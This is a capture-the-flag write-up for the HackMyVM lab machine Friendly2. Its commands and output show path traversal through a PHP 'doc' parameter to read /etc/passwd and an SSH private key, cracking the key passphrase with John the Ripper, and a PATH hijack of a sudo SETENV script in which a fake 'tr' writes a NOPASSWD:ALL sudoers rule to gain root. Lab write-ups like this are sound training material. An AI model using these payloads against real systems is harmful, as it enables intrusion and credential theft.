# Friendly2

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Friendly2 | RiJaba1 | Beginner | HackMyVM |

**Summary:** The Friendly2 machine presents a deceptively clean web surface that conceals a critical Local File Inclusion vulnerability in a PHP endpoint disclosed through a developer's careless HTML comment. An attacker performing directory enumeration discovers the `/tools/` path, and closer inspection of its index page reveals a commented line referencing `check_if_exist.php?doc=keyboard.html`. This parameter accepts arbitrary file paths without sanitisation, allowing full traversal of the filesystem. Reading `/etc/passwd` exposes a local user named `gh0st`, and subsequent traversal of that user's `.ssh` directory yields an AES-256-CBC encrypted OpenSSH private key. The passphrase is recovered by feeding the key into `ssh2john` and cracking the resulting hash against the `rockyou.txt` wordlist with John the Ripper, achieving an SSH session as `gh0st`. Privilege escalation exploits a subtle but decisive misconfiguration in the `sudo` policy: the user is permitted to execute `/opt/security.sh` as any user with the `SETENV` flag set and no password required. The shell script internally calls `tr` using a relative, unqualified path. Because `SETENV` allows the caller to inject an arbitrary `PATH` at sudo invocation time, a malicious executable named `tr` is planted in `/tmp`, and the script is executed with `PATH=/tmp` prepended. The hijacked `tr` silently writes an unrestricted `NOPASSWD:ALL` sudoers rule for `gh0st`, granting full root access via `sudo -i`. The root flag itself is a final puzzle: it resides not in `/root/root.txt` but inside a hidden directory literally named `...` at the filesystem root, and its content is ROT13-encoded, requiring one final application of `tr` to decode.

---

## Reconnaissance

The engagement begins with a network sweep to locate the target virtual machine on the local subnet.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.156 08:00:27:0C:8F:A4 VirtualBox
```

The target is identified at `192.168.100.156`. Environment variables are set for convenience, then a full-port Nmap scan with service and script detection is launched.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ ip=192.168.100.156 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 08:17 WIB
Nmap scan report for 192.168.100.156
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
|_  256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Servicio de Mantenimiento de Ordenadores
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```

The scan reveals exactly two open ports: port 22 running OpenSSH 8.4p1 on Debian, and port 80 running Apache 2.4.56. The HTTP title "Servicio de Mantenimiento de Ordenadores" (Computer Maintenance Service) hints at a Spanish-language business website. With only two attack surfaces, web enumeration becomes the immediate priority.

---

## Web Enumeration

Feroxbuster is used to brute-force directories and common file extensions against the web root, revealing the application's structure in full.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ feroxbuster -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,jpg,html,zip,bak,pem,log,yml,js

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.156/
 🚩  In-Scope Url          │ 192.168.100.156
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, jpg, html, zip, bak, pem, log, yml, js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       91l      262w     2698c http://192.168.100.156/
200      GET       91l      262w     2698c http://192.168.100.156/index.html
301      GET        9l       28w      318c http://192.168.100.156/tools => http://192.168.100.156/tools/
301      GET        9l       28w      319c http://192.168.100.156/assets => http://192.168.100.156/assets/
200      GET     1965l    11601w   977099c http://192.168.100.156/assets/laptop.png
200      GET     1710l     9966w   851305c http://192.168.100.156/assets/keyboard.png
200      GET       24l      148w     6861c http://192.168.100.156/assets/sirena.gif
200      GET      644l     3260w   244133c http://192.168.100.156/assets/monitor.png
200      GET       29l       99w      813c http://192.168.100.156/tools/index.html
200      GET       35l      101w      841c http://192.168.100.156/tools/documents/monitor.html
301      GET        9l       28w      328c http://192.168.100.156/tools/documents => http://192.168.100.156/tools/documents/
200      GET       50l      126w     1169c http://192.168.100.156/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.100.156/tools/documents/laptop.html
```

The `/tools/` directory and its nested `/tools/documents/` path are particularly interesting. Fetching `/tools/index.html` reveals an internally-marked confidential page, and more critically, a developer left an unstripped HTML comment that leaks the name of a PHP script.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ curl -s http://$ip/tools/index.html
<!DOCTYPE html>
<html>

        <head>
                <meta charset="UTF-8">
                <title>Sistema de herramientas</title>
                <style>
                        h1{text-align: center;}
                </style>
        </head>

        <body>
                <h1 text-align="center"> <img src="/assets/sirena.gif"> INFORMACIÓN PRIVADA <img src="/assets/sirena.gif"> </h1>
                <div>
                        <p> Toda la información de esta página está catalogada con un nivel de confidencialidad 4, esta información no deberá ser envidada ni compartida a ningún agente externo a la empresa.
                </div>

                <div>
                        <h2> To do: </h2>
                        <ul>
                                <li> Añadir imágenes a la web principal. </li>
                                <li> Añadir tema oscuro </li>
                                <li> Traducir la página al inglés / translate the page into English. 😉</li>
                                <!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
                        </ul>
                </div>
        </body>

</html>
```

The comment `<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->` is a significant intelligence leak. It reveals that a PHP script named `check_if_exist.php` accepts a `doc` query parameter to reference files by name, almost certainly without proper path validation.

---

## Initial Access

### Local File Inclusion (LFI) Exploitation

**Step 1:** The `doc` parameter is immediately tested with a path traversal sequence targeting `/etc/passwd` to verify whether the include is unsanitised.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ curl -s "http://$ip/tools/check_if_exist.php?doc=../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```

The traversal succeeds without restriction, and the contents of `/etc/passwd` are returned in full. The only non-system user with a login shell is `gh0st` at UID 1001, with a home directory at `/home/gh0st`.

**Step 2:** With a valid username and knowledge of the home directory path, the LFI is used to attempt reading the user's SSH private key.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ curl -s "http://$ip/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABC7peoQE4
................................[REDACTED]............................
9tDhjVw3oagRmc3R03zfIwbPINo=
-----END OPENSSH PRIVATE KEY-----
```

An SSH private key is present and readable. The header `aes256-ctr` and `bcrypt` in the base64 blob identify it as an AES-256-CTR key protected by a bcrypt-derived passphrase. The key is saved locally and its permissions are locked down.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ curl -s "http://$ip/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa" > id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ chmod 600 id_rsa
```

### SSH Private Key Cracking

**Step 3:** Direct use of the key confirms it is passphrase protected.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
Load key "id_rsa": incorrect passphrase supplied to decrypt private key
```

**Step 4:** `ssh2john` extracts the crackable hash from the private key, and John the Ripper attacks it using the `rockyou.txt` wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
c[REDACTED]           (id_rsa)
1g 0:00:00:13 DONE (2026-03-10 08:33) 0.07304g/s 18.69p/s 18.69c/s 18.69C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2i1yzi3G5QPSlTgc/[REDACTED]KUuD7blQDOskWZR8KsegciUa8= gh0st@friendly2
```

The passphrase is recovered in under 14 seconds. The key is confirmed functional by `ssh-keygen -y`, which successfully exports the corresponding public key.

**Step 5:** SSH access is established using the recovered key and its passphrase.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly2]
└─$ ssh -i id_rsa gh0st@$ip
...
gh0st@friendly2:~$ id ; ls -la
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)
total 32
drwxr-xr-x 4 gh0st gh0st 4096 Apr 29  2023 .
drwxr-xr-x 3 root  root  4096 Apr 27  2023 ..
lrwxrwxrwx 1 root  root     9 Apr 29  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gh0st gh0st  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 gh0st gh0st 3526 Mar 27  2022 .bashrc
drwxr-xr-x 3 gh0st gh0st 4096 Apr 29  2023 .local
-rw-r--r-- 1 gh0st gh0st  807 Mar 27  2022 .profile
drwx--x--x 2 gh0st gh0st 4096 Apr 29  2023 .ssh
-r--r----- 1 gh0st root    33 Apr 27  2023 user.txt
```

A shell is obtained as `gh0st`. The user flag resides at `~/user.txt`. Note that `.bash_history` is symlinked to `/dev/null`, indicating the machine owner intentionally prevents command history logging.

---

## Privilege Escalation

### Sudo Policy Enumeration

Immediately after landing, `sudo -l` is run to enumerate any granted privileges.

```bash
gh0st@friendly2:~$ which sudo
/usr/bin/sudo
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

The rule has two critical properties. First, `NOPASSWD` means the script can be run as root without entering a password. Second, and most importantly, `SETENV` means the caller is permitted to pass environment variables through to the sudo invocation, including `PATH`. This defeats the protection that `secure_path` would otherwise provide, because `SETENV` allows overriding the carefully restricted `secure_path` variable entirely when environment variables are explicitly supplied via `sudo env VAR=val` or `sudo VAR=val`.

### Analysing the Target Script

The script is readable and its logic is fully inspected.

```bash
gh0st@friendly2:~$ file /opt/security.sh
/opt/security.sh: Bourne-Again shell script, ASCII text executable
gh0st@friendly2:~$ ls -la /opt/security.sh
-rwxr-xr-x 1 root root 561 Apr 29  2023 /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

The script performs ROT13 encoding using `tr`. The vulnerability is that `tr` is invoked without an absolute path (`/usr/bin/tr`). The script simply calls `tr`, meaning it relies entirely on `PATH` resolution at runtime. Because `SETENV` allows injecting a custom `PATH` into the sudo execution context, a malicious binary named `tr` can be placed earlier in the path than the real one.

### PATH Hijacking via SETENV

**Step 1:** A malicious `tr` script is created in `/tmp`. Instead of translating characters, it writes a new, unrestricted sudoers rule for `gh0st` into `/etc/sudoers.d/`.

```bash
gh0st@friendly2:/tmp$ echo 'echo "gh0st ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/gh0st' > /tmp/tr
gh0st@friendly2:/tmp$ chmod +x /tmp/tr
```

**Step 2:** The legitimate script is executed via sudo with `/tmp` prepended to `PATH`. When the script reaches the `tr` call, Bash resolves `/tmp/tr` first, executing the malicious payload as root.

```bash
gh0st@friendly2:/tmp$ sudo PATH=/tmp:$PATH /opt/security.sh
Enter the string to encode:
pwned
Original string: pwned
Encoded string:
```

The empty `Encoded string:` output confirms that the real `tr` was never called. The fake `tr` ran silently and wrote the sudoers file.

**Step 3:** The new sudo rule is verified.

```bash
gh0st@friendly2:/tmp$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
    (ALL : ALL) NOPASSWD: ALL
```

The second entry `(ALL : ALL) NOPASSWD: ALL` confirms that `gh0st` can now run any command as any user with no password. A root shell is opened immediately.

```bash
gh0st@friendly2:/tmp$ sudo -i
root@friendly2:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
friendly2
```

---

## Capturing the Flags

The user flag is read first from `gh0st`'s home directory, then the root flag is sought.

```bash
root@friendly2:~# cat /home/gh0st/user.txt /root/root.txt
ab0[REDACTED]
Not yet! Try to find root.txt.


Hint: ...
```

The root flag is not in the standard location. The hint `...` is literal: a hidden directory named `...` (three dots) exists at the filesystem root.

```bash
root@friendly2:~# find / -name "..." 2>/dev/null
/...
root@friendly2:~# ls -la /.../ebbg.txt
-r-------- 1 root root 100 Apr 29  2023 /.../ebbg.txt
root@friendly2:~# cat /.../ebbg.txt
It's codified, look the cipher:

981[REDACTED]



Hint: numbers are not codified
```

The content of `ebbg.txt` is ROT13-encoded. The filename itself is a hint: `ebbg` is the ROT13 encoding of `root`. The `PATH` variable is restored first to ensure the real `tr` is used, and the flag is decoded.

```bash
root@friendly2:~# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@friendly2:~# which tr
/usr/bin/tr
root@friendly2:~# echo '981[REDACTED]' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
981[REDACTED]
```

The root flag is successfully decoded.

---

## Attack Chain Summary

1. **Reconnaissance**: A full-port Nmap scan identified two services: OpenSSH 8.4p1 on port 22 and Apache 2.4.56 on port 80, running on a Debian Linux host.

2. **Vulnerability Discovery**: Feroxbuster enumerated the `/tools/` directory and its `index.html`. Reading that page revealed an HTML comment exposing the `check_if_exist.php?doc=` endpoint. Testing confirmed an unauthenticated, unsanitised Local File Inclusion vulnerability allowing full path traversal.

3. **Exploitation**: The LFI was used to read `/etc/passwd` (identifying user `gh0st`) and then `/home/gh0st/.ssh/id_rsa` (an AES-256/bcrypt-protected SSH private key). The passphrase was cracked with `ssh2john` and John the Ripper against `rockyou.txt`, yielding an authenticated SSH session as `gh0st`.

4. **Internal Enumeration**: Sudo enumeration revealed that `gh0st` could run `/opt/security.sh` as root with `SETENV` and no password. The script was found to call `tr` using a relative path, making it vulnerable to PATH hijacking.

5. **Privilege Escalation**: A malicious `/tmp/tr` script was created to write an unrestricted sudoers rule. The legitimate script was invoked via `sudo PATH=/tmp:$PATH /opt/security.sh`, causing the hijacked `tr` to execute as root. With `NOPASSWD:ALL` written to `/etc/sudoers.d/gh0st`, a root shell was obtained with `sudo -i`. The root flag was found in the hidden `/...` directory encoded with ROT13 and decoded with `tr`.
